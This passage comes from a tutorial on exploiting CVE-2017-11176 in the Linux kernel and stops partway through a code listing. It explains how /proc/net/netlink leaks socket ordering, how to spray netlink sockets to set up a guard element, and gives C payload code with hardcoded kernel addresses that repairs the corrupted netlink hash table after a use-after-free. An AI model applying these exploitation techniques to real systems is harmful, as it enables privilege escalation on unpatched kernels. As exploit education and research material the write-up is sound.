<em>pid</em> (i.e. not <em>MAGIC_NL_PID</em>) and the <em>rnd</em> value of the hash table</li><li><strong>Walk the bucket list</strong> until we find our reallocated element while saving the address of the previous element</li><li>Fix the "pprev" value</li></ol><p>Note that 3) implies that we know the address of our reallocated element. We actually do! It is stored in the <strong>sk</strong> field in the <em>socket</em> structure. <strong>Moreover, the <em>next</em> pointer (<em>hlist_node</em>) is the very first field of a <em>netlink_sock</em></strong>. In other words, its address is the same as <em>sk</em>. That's why we save it before overwriting it with <em>NULL</em> (cf. Fixing the <em>struct socket</em>).</p><p><strong>WARNING</strong>: 2) implies that the hash table hasn't been diluted. We will see how to minimize the risk.</p><p>One problem fixed!</p><h3 id="we-need-a-friend-information-leak">We Need A Friend: Information Leak</h3><p>In the previous section, we saw that we can fix the <em>pprev</em> pointer of our reallocated element by walking the bucket list. We still need to restore the <em>next</em> pointer prior calling <em>__hlist_del()</em>. However we don't know where to make it point as the only link to the "next" element has been overwritten during the reallocation. So, what can we do?</p><p>At the very least, we can <strong>scan the whole memory</strong> to retrieve every <em>netlink_sock</em> object. Remember, the SLAB keeps track of partial/full slabs. That is, we can scan the kmalloc-1024 slabs, check that those objects are sockets (with <em>f_ops</em> field) of type <em>netlink_sock</em> (e.g. <em>private_data-&gt;sock-&gt;ops == &amp;netlink_ops</em>) with protocol <em>NETLINK_USERSOCK</em>, etc. Then, we can check that one of these objects has its <em>pprev</em> field pointing to our reallocated element. It will work, but scanning the memory can take a lot of time. Please note that sometimes (depending on your exploit) it is the only way to fix the kernel!</p><p><strong>NOTE</strong>: it can be harder to do it on a system using SLUB as it doesn't keep track of "full" slabs. You will need to retrieve them by parsing the <em>struct page</em>, etc.</p><p>Instead, what we will try to do here is to <strong>setup a "guard" element that is located just after our reallocated element</strong>. That is, we can retrieve its address with the help of the <em>file descriptor table</em> (just like we did with our reallocated element).</p><p>Alas, this is not <em>that</em> easy:</p><ol><li>we cannot predict in which bucket an element will land because of the hash function</li><li>elements are inserted at the head of a bucket list (i.e. we can't put it "after")</li></ol><p>Because of 2), the guard element should be inserted <strong>prior</strong> our target/reallocated element. But how to deal with 1)?</p><p>Maybe, the hash function is "reversible"? Don't think so... Remember, the hash function uses a <em>pid</em> and the <em>hash-&gt;rnd</em> values. The later is unknown <strong>before</strong> exploiting the bug.</p><p><strong>The solution is to actually create a lot of netlink sockets (similar to spraying). Chances are that two of our sockets will be adjacent in a bucket list</strong>. But then, how to detect it?</p><p>In this kind of situation, where you are missing something, you need a friend: <strong>an information leak</strong>.</p><p>The Linux kernel has a lot of information leak of various kinds. Some comes from a bug and some are "legitimates". We will use the latter. In particular, there is a location that is full of them: <strong>the <em>proc</em> file system</strong>.</p><p><strong>NOTE</strong>: The <em>proc fs</em> is a pseudo file system which only exists in memory and is used to get information from the kernel and/or set system-wide settings. The API used to manipulate them is <strong>seq_file</strong>. Please read the <a href="https://kernelnewbies.org/Documents/SeqFileHowTo">SeqFileHowTo</a> to have a better understanding.</p><h3 id="procfs-to-the-rescue">ProcFS to The Rescue!</h3><p>More specifically, we will use <strong>/proc/net/netlink</strong> which is still (at the time of writing) world-readable. The aforementioned proc fs file is created here:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__net_init</span><span class="w"> </span><span class="n">netlink_net_init</span><span class="p">(</span><span class="k">struct</span> <span class="nc">net</span><span class="w"> </span><span class="o">*</span><span class="n">net</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="cp">#ifdef CONFIG_PROC_FS</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">proc_net_fops_create</span><span class="p">(</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="s">"netlink"</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">netlink_seq_fops</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span><span class="w"></span>
<span class="cp">#endif</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>And uses the following callbacks:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">seq_operations</span><span class="w"> </span><span class="n">netlink_seq_ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">start</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_seq_start</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">next</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_seq_next</span><span class="p">,</span><span class="w">   </span><span class="c1">// &lt;----- this</span>
<span class="w">    </span><span class="p">.</span><span class="n">stop</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_seq_stop</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">show</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_seq_show</span><span class="p">,</span><span class="w">   </span><span class="c1">// &lt;----- this</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>A typical output is:</p><div class="highlight"><pre><span></span><code>$ cat /proc/net/netlink 
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
ffff88001eb47800 0   0      00000000 0        0        (null) 2        0       
ffff88001fa66800 6   0      00000000 0        0        (null) 2        0       
...
</code></pre></div><p>Wow! It even <strong>leaks kernel pointers</strong>! Each line being printed by <em>netlink_seq_show()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_seq_show</span><span class="p">(</span><span class="k">struct</span> <span class="nc">seq_file</span><span class="w"> </span><span class="o">*</span><span class="n">seq</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">v</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">v</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SEQ_START_TOKEN</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">seq_puts</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="s">"sk       Eth Pid    Groups   "</span><span class="w"></span>
<span class="w">             </span><span class="s">"Rmem     Wmem     Dump     Locks     Drops</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="n">seq_printf</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span><span class="w"> </span><span class="s">"%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="c1">// &lt;----- VULNERABILITY (patched)</span>
<span class="w">               </span><span class="n">s</span><span class="p">,</span><span class="w"></span>
<span class="w">               </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sk_protocol</span><span class="p">,</span><span class="w"></span>
<span class="w">               </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span><span class="w"></span>
<span class="w">               </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">groups</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">               </span><span class="n">sk_rmem_alloc_get</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="w"></span>
<span class="w">               </span><span class="n">sk_wmem_alloc_get</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="w"></span>
<span class="w">               </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">cb</span><span class="p">,</span><span class="w"></span>
<span class="w">               </span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sk_refcnt</span><span class="p">),</span><span class="w"></span>
<span class="w">               </span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sk_drops</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The format string of <em>seq_printf()</em> uses <strong>%p</strong> instead of <strong>%pK</strong> to dump the sock's address. Note that this vulnerability has already been fixed with the help of <a href="https://lwn.net/Articles/420403/">kptr_restrict</a>. With the "K" modifier, the address printed will be <em>0000000000000000</em> for normal users. <strong>Let's assume that is the case</strong>. What other things can we get with this file?</p><p>Let's have a look to <em>netlink_seq_next()</em> which is in charge to select the next <em>netlink_sock</em> that will be printed:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="nf">netlink_seq_next</span><span class="p">(</span><span class="k">struct</span> <span class="nc">seq_file</span><span class="w"> </span><span class="o">*</span><span class="n">seq</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">v</span><span class="p">,</span><span class="w"> </span><span class="n">loff_t</span><span class="w"> </span><span class="o">*</span><span class="n">pos</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">nl_seq_iter</span><span class="w"> </span><span class="o">*</span><span class="n">iter</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nl_table</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">hash</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">mask</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sk_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span><span class="w"></span>
<span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">sock_net</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">seq_file_net</span><span class="p">(</span><span class="n">seq</span><span class="p">))</span><span class="w"></span>
<span class="w">                </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sk_next</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">                         </span><span class="c1">// &lt;----- NULL-deref'ed here ("cat /proc/net/netlink")</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="n">iter</span><span class="o">-&gt;</span><span class="n">link</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>
<span class="w">                </span><span class="n">iter</span><span class="o">-&gt;</span><span class="n">hash_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">j</span><span class="p">;</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">s</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">        </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">++</span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAX_LINKS</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>That is, it walks every hash tables from 0 to <em>MAX_LINKS</em>. Then, for each table, it walks every bucket from 0 to <em>hash-&gt;mask</em>. And finally, for each bucket, it walks from the first element to the last.</p><p>In other words, <strong>it prints elements "in order"</strong>. Can you see it coming? :-)</p><h3 id="the-solution">The Solution</h3><p>Let's suppose we have created a lot of netlink sockets. By scanning this <em>procfs</em> file we can know if two of our netlink sockets are "adjacent". This is the information leak we were lacking!</p><p><strong>BEWARE! If we see two of our netlink sockets printed one after the other does NOT mean they are actually adjacent.</strong></p><p>It either means that:</p><ol><li>they are adjacent OR</li><li>the first element is the last element of a bucket and the second element is the first element of ANOTHER bucket</li></ol><p><strong>NOTE</strong>: For the rest of this article we will call the first element the <strong>target</strong> and the second element the <strong>guard</strong>.</p><p>So, if we are in the first case, removing the guard element will fix up the <em>next</em> field of our target (cf. Fixing a Corrupted List). In the second case, removing the guard will actually do nothing to our target.</p><p>What do we know about the last element in a hash list? The next pointer is NULL. That is, we can set the value of the <em>next</em> pointer of our target to NULL during the reallocation. If we were in the second case, the <em>next</em> pointer would then be "already" fixed. But, guess what...</p><p><strong>The <em>next</em> pointer is the FIRST field of <em>netlink_sock</em> and is the ONLY field that we DO NOT CONTROL with our reallocation primitive...</strong> It matches the <em>cmsg_len</em> which is 1024 in our case (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>).</p><p>During the bucket list walking (which deref <em>next</em> pointers), it is expected that the <em>next</em> field of last element is set to <em>NULL</em>. However, it is 1024 in our case. That is, the kernel tries to dereference it but <strong>any dereference below the <em>mmap_min_addr</em> limit provokes a NULL-deref</strong>. That's why we are crashing with "cat /proc/net/netlink".</p><p><strong>NOTE</strong>: You can retrieve this value with <em>/proc/sys/vm/mmap_min_addr</em> which is something like 0x10000.</p><p>Note that we provoked the crash here (on purpose), yet <strong>this crash can occur whenever our target's bucket list is walked</strong>. In particular, another application using <em>NETLINK_USERSOCK</em> may generate a crash by inserting an element in our bucket list (i.e. collision). Things get even worse if a "dilution" happens as every bucket list is walked in order to re-insert all elements. We definitely need to fix this!</p><p>Well, this is actually pretty simple... just need to reset our reallocation <em>next</em> pointer to NULL during kernel reparation if we are in the first scenario.</p><p>In the end, considering we have setup and released a "guard" element, fixing the hash table can be done as follows:</p><ol><li>Retrieve the <em>NETLINK_USERSOCK</em>'s hash table</li><li>Replay the <em>nl_pid_hashfn()</em> hash function to retrieve our target's bucket list</li><li>Walk the bucket list while keeping a "prev" pointer until we find our target</li><li>Inspect the "next" pointer of our target. If it is 1024, we are in the first scenario, just reset it to <em>NULL</em>. Otherwise, do nothing, the guard element already fixed us</li><li>Fix our target's "pprev" field</li><li>Do a <em>__hlist_del()</em> operation to fix the bucket's list (hence the dangling pointers)</li><li>Stop walking</li></ol><p>Alright, let's implement it:</p><div class="highlight"><pre><span></span><code><span class="c1">// kernel function symbols</span>
<span class="cp">#define NL_PID_HASHFN         ((void*) 0xffffffff814b6da0)</span>
<span class="cp">#define NETLINK_TABLE_GRAB    ((void*) 0xffffffff814b7ea0)</span>
<span class="cp">#define NETLINK_TABLE_UNGRAB  ((void*) 0xffffffff814b73e0)</span>
<span class="cp">#define NL_TABLE_ADDR         ((void*) 0xffffffff824528c0)</span>

<span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">**</span><span class="n">pprev</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="o">*</span><span class="w"> </span><span class="n">table</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rehash_time</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">mask</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">shift</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">entries</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">max_shift</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">rnd</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">netlink_table</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="n">hash</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">mc_list</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">listeners</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">nl_nonroot</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">groups</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">cb_mutex</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">module</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">registered</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">typedef</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">netlink_table_grab_func</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span><span class="w"></span>
<span class="k">typedef</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">netlink_table_ungrab_func</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span><span class="w"></span>
<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">nl_pid_hashfn_func</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">pid</span><span class="p">);</span><span class="w"></span>

<span class="cp">#define netlink_table_grab() \</span>
<span class="cp">  (((netlink_table_grab_func)(NETLINK_TABLE_GRAB))())</span>
<span class="cp">#define netlink_table_ungrab() \</span>
<span class="cp">  (((netlink_table_ungrab_func)(NETLINK_TABLE_UNGRAB))())</span>
<span class="cp">#define nl_pid_hashfn(hash, pid) \</span>
<span class="cp"> (((nl_pid_hashfn_func)(NL_PID_HASHFN))(hash, pid))</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_current</span><span class="p">(</span><span class="n">restored_rsp</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current</span><span class="o">-&gt;</span><span class="n">files</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">[</span><span class="n">unblock_fd</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"> </span><span class="c1">// keep it for list walking</span>
<span class="w">  </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// fix the 'sk' dangling pointer</span>

<span class="w">  </span><span class="c1">// lock all hash tables</span>
<span class="w">  </span><span class="n">netlink_table_grab</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// retrieve NETLINK_USERSOCK's hash table</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">netlink_table</span><span class="w"> </span><span class="o">*</span><span class="n">nl_table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">netlink_table</span><span class="o">**</span><span class="p">)</span><span class="n">NL_TABLE_ADDR</span><span class="p">;</span><span class="w"> </span><span class="c1">// deref it!</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="p">(</span><span class="n">nl_table</span><span class="p">[</span><span class="n">NETLINK_USERSOCK</span><span class="p">].</span><span class="n">hash</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// retrieve the bucket list</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="o">*</span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nl_pid_hashfn</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">g_target</span><span class="p">.</span><span class="n">pid</span><span class="p">);</span><span class="w"> </span><span class="c1">// the original pid</span>

<span class="w">  </span><span class="c1">// walk the bucket list</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">cur</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">**</span><span class="n">pprev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">bucket</span><span class="o">-&gt;</span><span class="n">first</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="o">-&gt;</span><span class="n">first</span><span class="p">;</span><span class="w"> </span><span class="n">cur</span><span class="p">;</span><span class="w"> </span><span class="n">pprev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="n">cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// is this our target ?</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cur</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="o">*</span><span class="p">)</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="c1">// fix the 'next' and 'pprev' field</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="o">*</span><span class="p">)</span><span class="n">KMALLOC_TARGET</span><span class="p">)</span><span class="w"> </span><span class="c1">// 'cmsg_len' value (reallocation)</span>
<span class="w">        </span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// first scenario: was the last element in the list</span>
<span class="w">      </span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pprev</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="c1">// __hlist_del() operation (dangling pointers fix up)</span>
<span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pprev</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">entries</span><span class="o">--</span><span class="p">;</span><span class="w"> </span><span class="c1">// make it clean</span>

<span class="w">      </span><span class="c1">// stop walking</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// release the lock</span>
<span class="w">  </span><span class="n">netlink_table_ungrab</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Note that <strong>the whole operation is made under lock</strong> with <em>netlink_table_grab()</em> and <em>netlink_table_ungrab()</em>, just like the kernel do! Otherwise, we might corrupt the kernel if another thread is modifying it.</p><p>It wasn't <em>that</em> terrible after all :-)</p><p>Psst! The above code only works if we have setup a "guard" element, so... let's do it!</p><h3 id="setting-up-the-guard">Setting Up the Guard</h3><p>As stated above, we will do a spray-like technique in order to setup the guard. The idea being to create a lot of netlink socket, autobind them and then scan the hash table to "select" two sockets that we own which are potentially adjacent.</p><p>First, let's create a <em>create_netlink_candidate()</em> function that creates a socket and autobind it:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
